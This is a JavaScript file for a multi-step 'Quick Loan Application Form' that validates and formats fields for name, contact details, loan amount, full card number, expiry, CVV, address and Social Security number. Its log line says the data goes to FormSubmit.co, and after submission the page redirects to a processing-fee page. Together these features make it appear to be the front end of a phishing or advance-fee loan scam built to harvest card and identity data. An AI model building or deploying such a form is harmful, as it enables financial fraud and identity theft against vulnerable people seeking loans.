/**
 * Quick Loan Application Form - JavaScript
 * Handles form navigation, validation, and submission
 */

// ============================================
// State Management
// ============================================
const FormState = {
    currentStep: 1,
    totalSteps: 4,
    isSubmitted: false,

    reset() {
        this.currentStep = 1;
        this.isSubmitted = false;
    }
};

// ============================================
// Step Navigation
// ============================================
function nextStep() {
    if (validateCurrentStep()) {
        if (FormState.currentStep < FormState.totalSteps) {
            hideStep(FormState.currentStep);
            FormState.currentStep++;
            showStep(FormState.currentStep);
            updateProgressIndicator();
            scrollToTop();
        }
    }
}

function prevStep() {
    if (FormState.currentStep > 1) {
        hideStep(FormState.currentStep);
        FormState.currentStep--;
        showStep(FormState.currentStep);
        updateProgressIndicator();
        scrollToTop();
    }
}

function showStep(stepNumber) {
    const step = document.getElementById(`step${stepNumber}`);
    if (step) {
        step.classList.add('active');
    }
}

function hideStep(stepNumber) {
    const step = document.getElementById(`step${stepNumber}`);
    if (step) {
        step.classList.remove('active');
    }
}

function scrollToTop() {
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

// ============================================
// Progress Indicator
// ============================================
function updateProgressIndicator() {
    const dots = document.querySelectorAll('.step-dot');
    dots.forEach((dot, index) => {
        if (index < FormState.currentStep) {
            dot.classList.add('active');
        } else {
            dot.classList.remove('active');
        }
    });
}

// ============================================
// Form Validation
// ============================================
const Validators = {
    email: (value) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(value);
    },

    phone: (value) => {
        const phoneRegex = /^[\d\s\-\+\(\)]{10,}$/;
        return phoneRegex.test(value.replace(/\D/g, '')) && value.replace(/\D/g, '').length >= 10;
    },

    ssn: (value) => {
        return /^\d{3}-\d{2}-\d{4}$/.test(value) || /^\d{9}$/.test(value);
    },

    notEmpty: (value) => {
        return value.trim().length > 0;
    },

    cardNumber: (value) => {
        const num = value.replace(/\s/g, '');
        return /^\d{13,19}$/.test(num) && luhnCheck(num);
    },

    expiry: (value) => {
        return /^(0[1-9]|1[0-2])\/\d{2}$/.test(value);
    },

    cvv: (value) => {
        return /^\d{3,4}$/.test(value);
    }
};

function luhnCheck(num) {
    let sum = 0;
    let isEven = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let digit = parseInt(num[i], 10);
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
    }
    return sum % 10 === 0;
}

function validateCurrentStep() {
    clearAllErrors();
    let isValid = true;

    switch (FormState.currentStep) {
        case 1:
            isValid = validateStep1();
            break;
        case 2:
            isValid = validateStep2();
            break;
        case 3:
            isValid = validateStep3();
            break;
        case 4:
            isValid = validateStep4();
            break;
    }

    return isValid;
}

function validateStep1() {
    let isValid = true;

    const fullname = getFieldValue('fullname');
    const email = getFieldValue('email');
    const phone = getFieldValue('phone');

    if (!Validators.notEmpty(fullname)) {
        showError('fullname', 'Please enter your full name');
        isValid = false;
    }

    if (!Validators.email(email)) {
        showError('email', 'Please enter a valid email address');
        isValid = false;
    }

    if (!Validators.phone(phone)) {
        showError('phone', 'Please enter a valid phone number');
        isValid = false;
    }

    return isValid;
}

function validateStep2() {
    let isValid = true;

    const loanType = getFieldValue('loanType');
    const loanAmount = getFieldValue('loanAmount');
    const income = getFieldValue('income');

    if (!Validators.notEmpty(loanType)) {
        showError('loanType', 'Please select a loan type');
        isValid = false;
    }

    if (!loanAmount || loanAmount < 1000 || loanAmount > 500000) {
        showError('loanAmount', 'Loan amount must be between $1,000 and $500,000');
        isValid = false;
    }

    if (!income || income < 0) {
        showError('income', 'Please enter a valid annual income');
        isValid = false;
    }

    return isValid;
}

function validateStep3() {
    let isValid = true;

    const cardName = getFieldValue('cardName');
    const cardNumber = getFieldValue('cardNumber');
    const expiryDate = getFieldValue('expiryDate');
    const cvv = getFieldValue('cvcField');

    if (!Validators.notEmpty(cardName)) {
        showError('cardName', 'Please enter cardholder name');
        isValid = false;
    }

    if (!Validators.cardNumber(cardNumber.replace(/\s/g, ''))) {
        showError('cardNumber', 'Please enter a valid card number');
        isValid = false;
    }

    if (!Validators.expiry(expiryDate)) {
        showError('expiryDate', 'Please enter expiry date in MM/YY format');
        isValid = false;
    }

    if (!Validators.cvv(cvv)) {
        showError('cvcField', 'Please enter a valid CVV');
        isValid = false;
    }

    return isValid;
}

function validateStep4() {
    let isValid = true;

    const address = getFieldValue('address');
    const ssn = getFieldValue('ssn');
    const terms = document.getElementById('terms').checked;

    if (!Validators.notEmpty(address)) {
        showError('address', 'Please enter your full address');
        isValid = false;
    }

    if (!Validators.ssn(ssn)) {
        showError('ssn', 'Please enter a valid SSN (000-00-0000 or 000000000)');
        isValid = false;
    }

    if (!terms) {
        showError('terms', 'You must agree to the terms');
        isValid = false;
    }

    return isValid;
}

// ============================================
// Error Handling
// ============================================
function showError(fieldId, message) {
    const errorElement = document.getElementById(`${fieldId}-error`);
    const inputElement = document.getElementById(fieldId);

    if (errorElement) {
        errorElement.textContent = message;
        errorElement.classList.add('show');
        errorElement.style.display = 'block';
    }

    if (inputElement) {
        inputElement.classList.add('error');
    }
}

function clearAllErrors() {
    const errorMessages = document.querySelectorAll('.error-message');
    const errorInputs = document.querySelectorAll('.error');

    errorMessages.forEach((error) => {
        error.classList.remove('show');
        error.style.display = 'none';
    });

    errorInputs.forEach((input) => {
        input.classList.remove('error');
    });
}

function getFieldValue(fieldId) {
    const field = document.getElementById(fieldId);
    return field ? field.value.trim() : '';
}

// ============================================
// Form Submission
// ============================================
function initializeFormSubmission() {
    const form = document.getElementById('applicationForm');

    if (!form) return;

    form.addEventListener('submit', handleFormSubmit);
}

function handleFormSubmit(e) {
    e.preventDefault();

    if (FormState.isSubmitted) {
        return;
    }

    if (!validateAllSteps()) {
        return;
    }

    FormState.isSubmitted = true;

    showLoading(true);
    disableSubmitButton(true);

    const form = document.getElementById('applicationForm');
    form.submit();

    handlePostSubmission();
}

function validateAllSteps() {
    const step1Valid = validateFieldsInStep(1);
    const step2Valid = validateFieldsInStep(2);
    const step3Valid = validateFieldsInStep(3);
    const step4Valid = validateFieldsInStep(4);

    return step1Valid && step2Valid && step3Valid && step4Valid;
}

function validateFieldsInStep(stepNumber) {
    const currentStepBackup = FormState.currentStep;
    FormState.currentStep = stepNumber;
    const isValid = validateCurrentStep();
    FormState.currentStep = currentStepBackup;
    return isValid;
}

function handlePostSubmission() {
    setTimeout(() => {
        // Store application data in sessionStorage
        sessionStorage.setItem('applicantName', getFieldValue('fullname'));
        sessionStorage.setItem('applicantEmail', getFieldValue('email'));
        sessionStorage.setItem('loanType', getFieldValue('loanType'));
        sessionStorage.setItem('loanAmount', '$' + getFieldValue('loanAmount'));
        
        // Redirect to processing fee page
        window.location.href = 'processing-fee.html';
    }, 2000);
}

// ============================================
// UI Controls
// ============================================
function showLoading(show) {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.toggle('show', show);
        loading.style.display = show ? 'block' : 'none';
    }
}

function disableSubmitButton(disabled) {
    const submitButton = document.getElementById('submitButton');
    if (submitButton) {
        submitButton.disabled = disabled;
    }
}

function hideAllSteps() {
    document.querySelectorAll('.step').forEach((step) => {
        step.style.display = 'none';
    });
}

function showSuccessMessage() {
    const successMessage = document.getElementById('successMessage');
    if (successMessage) {
        successMessage.classList.add('show');
        successMessage.style.display = 'block';
    }
}

// ============================================
// Credit Card Visualization
// ============================================
function initializeCardVisualization() {
    const cardName = document.getElementById('cardName');
    const cardNumber = document.getElementById('cardNumber');
    const expiryDate = document.getElementById('expiryDate');
    const cvcField = document.getElementById('cvcField');
    const cardWrapper = document.getElementById('cardWrapper');

    if (cardName) {
        cardName.addEventListener('input', (e) => {
            document.getElementById('cardHolderDisplay').textContent = e.target.value.toUpperCase() || 'CARDHOLDER';
        });
    }

    if (cardNumber) {
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;

            // Detect card type
            const firstDigit = value[0];
            let cardType = 'VISA';
            if (firstDigit === '4') cardType = 'VISA';
            else if (firstDigit === '5') cardType = 'MASTERCARD';
            else if (firstDigit === '3') cardType = 'AMEX';
            else if (firstDigit === '6') cardType = 'DISCOVER';

            document.getElementById('cardType').textContent = cardType;
            document.getElementById('cardDisplay').textContent = formattedValue || '•••• •••• •••• ••••';
        });
    }

    if (expiryDate) {
        expiryDate.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
            document.getElementById('cardExpDisplay').textContent = value || 'MM/YY';
        });
    }

    if (cvcField) {
        cvcField.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            document.getElementById('cvcDisplay').value = e.target.value;
        });

        cvcField.addEventListener('focus', () => {
            if (cardWrapper) cardWrapper.classList.add('flipped');
        });

        cvcField.addEventListener('blur', () => {
            if (cardWrapper) cardWrapper.classList.remove('flipped');
        });
    }
}

// ============================================
// Input Formatting
// ============================================
function initializeInputFormatting() {
    // Phone Auto-formatting
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^\d\s\-\+\(\)]/g, '');
        });
    }

    // SSN Auto-formatting
    const ssnInput = document.getElementById('ssn');
    if (ssnInput) {
        ssnInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 5) {
                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
            } else if (value.length > 3) {
                value = value.slice(0, 3) + '-' + value.slice(3);
            }
            e.target.value = value;
        });
    }
}

// ============================================
// Iframe Load Handler
// ============================================
function initializeIframeHandler() {
    const iframe = document.getElementById('hiddenFrame');

    if (iframe) {
        iframe.addEventListener('load', () => {
            console.log('[v0] Form successfully submitted to FormSubmit.co');
        });
    }
}

// ============================================
// Real-time Validation
// ============================================
function initializeRealTimeValidation() {
    const inputs = document.querySelectorAll('input[required], select[required]');

    inputs.forEach((input) => {
        input.addEventListener('blur', () => {
            if (input.value.trim()) {
                input.classList.remove('error');
                const errorElement = document.getElementById(`${input.id}-error`);
                if (errorElement) {
                    errorElement.style.display = 'none';
                }
            }
        });
    });
}

// ============================================
// Initialization
// ============================================
function initialize() {
    console.log('[v0] Initializing Quick Loan Application Form...');

    // Initialize all modules
    initializeFormSubmission();
    initializeCardVisualization();
    initializeInputFormatting();
    initializeRealTimeValidation();
    initializeIframeHandler();

    // Set initial state
    updateProgressIndicator();

    console.log('[v0] Quick Loan Application Form initialized successfully!');
}

// ============================================
// Execute on DOM Ready
// ============================================
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
} else {
    initialize();
}